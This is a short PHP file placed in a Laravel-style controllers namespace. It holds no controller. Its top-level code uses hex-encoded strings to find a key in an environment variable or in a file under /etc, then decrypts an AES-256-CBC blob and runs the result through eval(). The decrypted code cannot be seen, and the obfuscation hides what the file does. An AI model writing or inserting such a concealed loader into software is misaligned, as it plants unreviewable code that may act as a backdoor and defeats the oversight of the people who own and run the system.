<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('3URn/LwOvBpPrK+cJUkDEw==');

$c=base64_decode(

'CmbuO3qFy9fyIzMt4OWirAyAAj93dqh2jV3GLx3Diq5pzikj/MVS8hTVr+l+9Vq8FMD+1IYdQwqf' .
'y2U/SHCAKMj1RJxu8qB9+wr2/irO28FCrp8lhnuS0BiwUs+S+l9N80yEllqvZvFLKuTjzYRLqgCn' .
'NyDtETTV5aS7dVyGdmjR8oKQ6NixaWM0MEvAiv+hmB94L8hRHXDFNyhV/myRyWBBIjNFuTL3CW/N' .
'Y03UCvW6K5+B9MrZRZGSlPia94ek'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

